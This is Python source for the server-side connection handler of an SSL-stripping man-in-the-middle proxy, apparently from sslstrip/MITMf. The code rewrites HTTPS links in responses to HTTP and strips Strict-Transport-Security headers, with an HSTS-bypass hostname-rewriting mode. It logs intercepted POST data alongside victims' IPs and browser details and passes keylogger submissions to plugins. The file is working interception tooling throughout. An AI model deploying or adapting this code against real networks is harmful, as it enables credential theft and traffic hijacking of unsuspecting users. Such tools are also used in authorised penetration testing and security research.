# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO, sys
import plugins

try:
    from user_agents import parse
except:
    pass

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor
from libs.sergioproxy.ProxyPlugins import ProxyPlugins

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlToken1         = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
    urlToken2         = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
    #urlToken2        = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):

        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.clientInfo       = None
        self.urlMonitor       = URLMonitor.getInstance()
        self.hsts             = URLMonitor.getInstance().isHstsBypass()
        self.plugins          = ProxyPlugins.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getPostPrefix(self):
        return "POST"

    def isHsts(self):
        return self.hsts

    def sendRequest(self):
        if self.command == 'GET':
            try:
                user_agent = parse(self.headers['user-agent'])
                self.clientInfo = "%s [type:%s-%s os:%s] "  % (self.client.getClientIP(), user_agent.browser.family, user_agent.browser.version[0], user_agent.os.family)
            except:
                self.clientInfo = "%s " % self.client.getClientIP()

            logging.info(self.clientInfo + "Sending Request: %s" % self.headers['host'])

        self.plugins.hook()
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.debug("Sending header: (%s => %s)" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        if 'clientprfl' in self.uri:
            self.plugins.hook()
        elif 'keylog' in self.uri:
            self.plugins.hook()
        else:
            logging.warning("%s %s Data (%s):\n%s" % (self.client.getClientIP(), self.getPostPrefix(), self.headers['host'], self.postData))
            self.transport.write(self.postData)

    def connectionMade(self):
        logging.debug("HTTP connection made.")
        self.plugins.hook()
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.debug("Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.debug("[ServerConnection] Receiving header: (%s => %s)" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)
            self.urlMonitor.addRedirection(self.client.uri, value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True

        elif (key.lower()== 'strict-transport-security'):
            logging.info("%s Zapped a strict-trasport-security header" % self.client.getClientIP())

        elif (key.lower() == 'content-length'):
            self.contentLength = value

        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)

        else:
            self.client.setHeader(key, value)

        self.plugins.hook()

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            try:
                HTTPClient.handleResponseEnd(self) #Gets rid of some generic errors
            except:
                pass

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.debug("Read from server:\n" + data)

        data = self.replaceSecureLinks(data)
        res = self.plugins.hook()
        data = res['data']

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        try:
            self.client.write(data) #Gets rid of some generic errors
        except:
            pass

        try:
            self.shutdown()
        except:
            logging.info("Client connection dropped before request finished.")

    def replaceSecureLinks(self, data):
        if self.hsts:

            sustitucion = {}
            patchDict = self.urlMonitor.patchDict

            if len(patchDict)>0:
                dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
                data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)

            iterator = re.finditer(ServerConnection.urlExpression, data)       
            for match in iterator:
                url = match.group()

                logging.debug("[ServerConnection] Found secure reference: " + url)
                nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
                logging.debug("[ServerConnection][HSTS] Replacing %s => %s"%(url,nuevaurl))
                sustitucion[url] = nuevaurl
                #data.replace(url,nuevaurl)

            #data = self.urlMonitor.DataReemplazo(data)
            if len(sustitucion)>0:
                dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
                data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)

            #logging.debug("HSTS DEBUG received data:\n"+data)   
            #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
            #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
            #if data.find("http://w.face")!=-1:
            #   logging.debug("HSTS DEBUG Found error in modifications")
            #   raw_input("Press Enter to continue")
            #return re.sub(ServerConnection.urlType, 'http://web.', data)
            return data

        else:

            iterator = re.finditer(ServerConnection.urlExpression, data)

            for match in iterator:
                url = match.group()

                logging.debug("Found secure reference: " + url)

                url = url.replace('https://', 'http://', 1)
                url = url.replace('&amp;', '&')
                self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

            data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
            return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:
                self.client.finish()
                self.transport.loseConnection()
            except:
                pass


